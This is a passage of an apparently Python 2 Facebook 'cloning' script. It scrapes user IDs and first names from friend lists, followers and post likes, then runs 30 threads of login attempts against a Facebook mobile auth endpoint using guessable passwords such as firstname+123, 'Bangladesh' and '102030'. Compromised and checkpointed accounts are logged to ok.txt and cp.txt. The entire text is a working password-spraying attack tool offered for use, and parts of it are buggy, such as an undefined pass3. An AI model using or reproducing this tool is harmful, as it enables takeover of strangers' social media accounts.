			print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif devil =="4":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input Post ID/Username :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		pass1=raw_input("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m ")
		pass2=raw_input("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
			z = json.loads(r.text)
			for i in z["data"]:
				uid=i['id']
				na=i['name']
				nm=na.rsplit(" ")[0]
				id.append(uid+'|'+nm)
		except KeyError:
			print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
			raw_input("\nPress Enter To Back")
			unikk()
	   
	elif devil =="0":
		menu()
	else:
		print ("[!] Please Select a Valid Option")
		crack2()
	print("\033[1;97m[✓]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
	time.sleep(0.5)
	print("\033[1;97m[\033[1;91m✓\033[1;97m]\033[1;92m Random Choice Password Cloning\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m[\x1b[1;93m✓\033[1;97m]\033[1;92m To Stop Process Press CTRL Then Press\033[1;91m z\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m--------------------------------------------------")
	
	
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass1+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass1+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		          
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass2+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass2+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
									
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print ('\033[1;97m[✓]\033[1;92m Process Has Been Completed')
	print('\033[1;97m[\x1b[1;93m✓\x1b[1;97m]\033[1;92m Total\x1b[1;93m CP \033[1;91m/\033[1;92mOK\033[1;93m:\x1b[1;97m\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
	print("\033[1;97m--------------------------------------------------")
	down()
def down():
    dow = raw_input("\033[1;97m[?]\033[1;93m Do Yoou Want To Download Cp File?\033[1;97m (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("\n\033[1;97m[!]\033[1;93m Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('\033[1;93m[✓]\033[1;92m File Downloaded Successfully')
        print("\033[1;93m[✓]\033[1;93m Please Open Your Internal Storage and Rename The File")
        raw_input("\033[1;97mPress Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("\033[1;91m[!] Please Select a Valid Option ")
        down()
		
def randm():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("[!] Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		login()
	os.system("clear")
	print logo
	os.system("python3 .loading.md")
        time.sleep(1)
        os.system('clear')
        print logo
	print ("\033[1;91m[\033[1;90m1\033[1;91m]\033[1;90m==\033[1;92m> \033[1;93mCrack From Friend List")
	print ("\033[1;91m[\033[1;90m2\033[1;91m]\033[1;90m==\033[1;92m> \033[1;93mCrack From Public ID")
	print ("\033[1;91m[\033[1;90m3\033[1;91m]\033[1;90m==\033[1;92m> \033[1;93mCrack From Followers")
	print ("\033[1;91m[\033[1;90m4\033[1;91m]\033[1;90m==\033[1;92m> \033[1;93mCrack From Page/Group/ID Post")
	print ('\033[1;91m[\033[1;90m0\033[1;91m]\033[1;90m==\033[1;92m> \033[1;91mBack')
	print("\033[1;97m--------------------------------------------------")
	randm2()
def randm2():
	select = raw_input("\n╰─➣ ")
	id=[]
	oks=[]
	cps=[]
	if select=="1":
		os.system("clear")
		print logo
		print("\033[1;97m--------------------------------------------------")
		print("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m fristname123 ")
		print("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m firstname1234")
		print3=raw_input("\033[1;93m[3]\033[1;97m Input Password :\033[1;96m ")
		pass4=raw_input("\033[1;93m[4]\033[1;97m Input Password  :\033[1;96m ")
		pass5=raw_input("\033[1;93m[5]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		print("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m fristname123 ")
		print("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m firstname1234")
		print3=raw_input("\033[1;93m[3]\033[1;97m Input Password :\033[1;96m ")
		pass4=raw_input("\033[1;93m[4]\033[1;97m Input Password  :\033[1;96m ")
		pass5=raw_input("\033[1;93m[5]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;91m[\x1b[1;92m✓\033[1;91m]\x1b[1;93m Account Name\033[1;91m :\x1b[1;92m "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			randm()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		print("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m fristname123 ")
		print("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m firstname1234")
		print3=raw_input("\033[1;93m[3]\033[1;97m Input Password :\033[1;96m ")
		pass4=raw_input("\033[1;93m[4]\033[1;97m Input Password  :\033[1;96m ")
		pass5=raw_input("\033[1;93m[5]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;91m[\x1b[1;92m✓\033[1;91m]\x1b[1;93m Account Name\033[1;91m :\x1b[1;92m "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			randm()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="4":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input Post ID :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		print("\033[1;93m[1]\033[1;97m Input Password  :\033[1;96m fristname123 ")
		print("\033[1;93m[2]\033[1;97m Input Password  :\033[1;96m firstname1234")
		print3=raw_input("\033[1;93m[3]\033[1;97m Input Password :\033[1;96m ")
		pass4=raw_input("\033[1;93m[4]\033[1;97m Input Password  :\033[1;96m ")
		pass5=raw_input("\033[1;93m[5]\033[1;97m Input Password  :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
			z = json.loads(r.text)
			for i in z["data"]:
				uid=i['id']
				na=i['name']
				nm=na.rsplit(" ")[0]
				id.append(uid+'|'+nm)
		except KeyError:
			print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
			raw_input("\nPress Enter To Back")
		        randm()
	   
	elif select =="0":
		menu()
	else:
		print ("[!] Please Select a Valid Option")
		randmm2()
	print("\033[1;97m[✓]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
	time.sleep(0.5)
	print("\033[1;97m[\x1b[1;93m✓\033[1;97m]\033[1;92m The Process Is Running In Background\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m[\033[1;91m✓\033[1;97m]\033[1;92m Random 5 Choice Password \033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m[\x1b[1;93m✓\033[1;97m]\033[1;92m To Stop Process Press CTRL Then Press\033[1;91m z\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m--------------------------------------------------")
	
	
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass1+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass1+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"786"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass2+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass2+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass3+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass3+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;94m[\033[1;97mCheck-Point\033[1;94m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass4+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass4+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass5+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\033[1;94m[\033[1;92mSuccessfull\033[1;94m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass5+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print ('\033[1;97m[✓]\033[1;92m Process Has Been Completed')
	print('\033[1;97m[\x1b[1;93m✓\x1b[1;97m]\033[1;92m Total\x1b[1;93m CP \033[1;91m/\033[1;92mOK\033[1;93m:\x1b[1;97m\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
	print("\033[1;97m--------------------------------------------------")
	down()
def down():
    dow = raw_input("\033[1;97m[?]\033[1;93m Do Yoou Want To Download Cp File?\033[1;97m (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("\n\033[1;97m[!]\033[1;93m Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('\033[1;93m[✓]\033[1;92m File Downloaded Successfully')
        print("\033[1;93m[✓]\033[1;93m Please Open Your Internal Storage and Rename The File")
        raw_input("\033[1;97mPress Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("\033[1;91m[!] Please Select a Valid Option ")
        down()
		
def morec():
    os.system("clear")
    print logo
    os.system("python3 .loading.md")
    time.sleep(1)
    os.system('clear')
    print logo
    print("\033[1;91m[\033[1;90m1\033[1;91m]\033[1;90m==\033[1;92m> \033[1;97mRandom Bangladesh Cloning")
    print("\033[1;91m[\033[1;90m2\033[1;91m]\033[1;90m==\033[1;92m> \033[1;97mRandom India Cloning")
    print("\033[1;91m[\033[1;90m0\033[1;91m]\033[1;90m==\033[1;92m> \033[1;91mBack")	
    time.sleep(0.5)
    print("\033[1;97m--------------------------------------------------")
    morec_man()
def morec_man():
    option = raw_input("\n╰─➣ ")
    if option =="1":
        bangla()
    if option =="2":
        indiaa()
    if option =="0":	
          menu()
    else:
          print ("[!] Please Select a Valid Option")
          morec_man()		
	
def bangla():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("[!] Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		login()
	os.system("clear")
	print logo
	print ("\033[1;93m[\033[1;90m1\x1b[1;93m]\033[1;90m==\033[1;92m> \033[1;93mCrack From Friend List")
	print ("\033[1;93m[\033[1;90m2\x1b[1;93m]\033[1;90m==\033[1;92m> \033[1;93mCrack From Public ID")
	print ("\033[1;93m[\033[1;90m3\x1b[1;93m]\033[1;90m==\033[1;92m> \033[1;93mCrack From Followers")
	print ("\033[1;93m[\033[1;90m4\x1b[1;93m]\033[1;90m==\033[1;92m> \033[1;93mCrack From Page/Group/ID Post")
	print ('\033[1;93m[\033[1;90m0\x1b[1;93m]\033[1;90m==\033[1;92m> \033[1;93mBack')
	print("\033[1;97m--------------------------------------------------")
	bangla2()
def bangla2():
	select = raw_input("\n╰─➣ ")
	id=[]
	oks=[]
	cps=[]
	if select=="1":
		os.system("clear")
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID/Username :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;91m[\x1b[1;92m✓\033[1;91m]\x1b[1;93m Account Name\033[1;91m :\x1b[1;92m "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID/Username :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;91m[\x1b[1;92m✓\033[1;91m]\x1b[1;93m Account Name\033[1;91m :\x1b[1;92m "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="4":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;93m Input ID/Username :\033[1;96m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
			z = json.loads(r.text)
			for i in z["data"]:
				uid=i['id']
				na=i['name']
				nm=na.rsplit(" ")[0]
				id.append(uid+'|'+nm)
		except KeyError:
			print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
			raw_input("\nPress Enter To Back")
			bangla()
	   
	elif select =="0":
		menu()
	else:
		print ("[!] Please Select a Valid Option")
		bangla2()
	print("\033[1;97m[✓]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
	time.sleep(0.5)
	print("\033[1;97m[\x1b[1;93m✓\033[1;97m]\033[1;92m The Process Is Running In Background\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m[\x1b[1;93m✓\033[1;97m]\033[1;92m To Stop Process Press CTRL Then Press\033[1;91m z\033[1;0m")
	time.sleep(0.5)
	print("\033[1;97m--------------------------------------------------")
	
	
	
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass1+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass1+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass2+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass2+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass3+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass3+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4="Bangladesh"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;94m[\033[1;97mCheck-Point\033[1;94m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass4+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass4+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="102030"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass5+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\033[1;94m[\033[1;92mSuccessfull\033[1;94m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass5+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6="556677"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                 print("\033[1;93m[\033[1;97mCheck\033[1;91m-\033[1;97mpoint\033[1;93m]\033[1;97m "+uid+"\033[1;90m==\033[1;92m>\033[1;97m"+pass6+"\033[1;90m=\033[1;92m>\033[1;97m"+name)
		                                                 cp=open("cp.txt","a")
		                                                 cp.write(uid+" | "+pass6+"\n")
		                                                 cp.close()
		                                                 cps.append(uid)
									
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print ('\033[1;97m[✓]\033[1;92m Process Has Been Completed')
